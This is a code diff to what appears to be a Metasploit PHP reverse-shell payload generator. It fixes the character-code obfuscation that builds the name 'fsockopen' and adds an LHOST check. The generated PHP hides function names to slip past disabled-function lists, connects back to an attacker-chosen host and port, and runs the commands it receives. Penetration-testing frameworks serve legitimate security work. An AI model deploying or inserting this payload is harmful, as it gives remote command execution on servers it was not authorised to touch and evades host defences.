@@ -68,6 +68,10 @@ module ReversePhp
 	#
 	def php_reverse_shell
 
+		if (!datastore['LHOST'] or datastore['LHOST'].empty?)
+			# LHOST should always be set when we get here...  but in case it isn't,
+			raise Rex::ArgumentError, "LHOST is required"
+		end
 		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
 		port = datastore['LPORT']
 
@@ -79,9 +83,9 @@ module ReversePhp
 		$ipaddr=long2ip(#{ipaddr});
 		$port=#{port};
 		$_=chr(95);$a=chr(97);$b=chr(98);$c=chr(99);$d=chr(100);$e=chr(101);
-		$f=chr(102);$h=chr(104);$i=chr(105);$l=chr(108);$m=chr(109);$n=chr(110);
-		$o=chr(111);$p=chr(112);$r=chr(114);$s=chr(115);$t=chr(116);$u=chr(117);
-		$x=chr(120);$y=chr(121);
+		$f=chr(102);$h=chr(104);$i=chr(105);$k=chr(107);$l=chr(108);$m=chr(109);
+		$n=chr(110);$o=chr(111);$p=chr(112);$r=chr(114);$s=chr(115);$t=chr(116);
+		$u=chr(117);$x=chr(120);$y=chr(121);
 		$disabled=@ini_get($d.$i.$s.$a.$b.$l.$e.$_.$f.$u.$n.$c.$t.$i.$o.$n.$s);
 		if(!empty($disabled)){
 			$disabled=preg_replace(chr(47).chr(91).chr(44).chr(32).chr(93).chr(43).chr(47),chr(44),$disabled);
@@ -138,7 +142,7 @@ module ReversePhp
 		}
 		$command=NULL;
 		$nofuncs=$n.$o.chr(32).$e.$x.$e.$c.chr(32).$f.$u.$n.$c.$t.$i.$o.$n.$s.chr(32).chr(61).chr(40);
-		if(is_callable(@f.@s.@o.@c.@k.@o.@p.@e.@n)and!in_array(@f.@s.@o.@c.@k.@o.@p.@e.@n,$disabled)){
+		if(is_callable($f.$s.$o.$c.$k.$o.$p.$e.$n)and!in_array($f.$s.$o.$c.$k.$o.$p.$e.$n,$disabled)){
 			$sock=fsockopen($ipaddr,$port);
 			while($cmd=fread($sock,2048)){
 				$output=myexec(substr($cmd,0,-1));
@@ -164,12 +168,10 @@ module ReversePhp
 		}
 		END_OF_PHP_CODE
 
-		shell.gsub!(/[\t\n]+/, "\t")
-		# spaces are important but there's no need for tabs and newlines, so
-		# randomize them bit
-		shell.gsub!("\t") { |s|
+		# randomize the spaces a bit
+		shell.gsub!(/\s+/) { |s|
 			len = rand(5)+2
-			set = "\x09\x20\x0d\x0a"
+			set = "\x09\x20\x0a"
 			buf = ''
 			
 			while (buf.length < len)
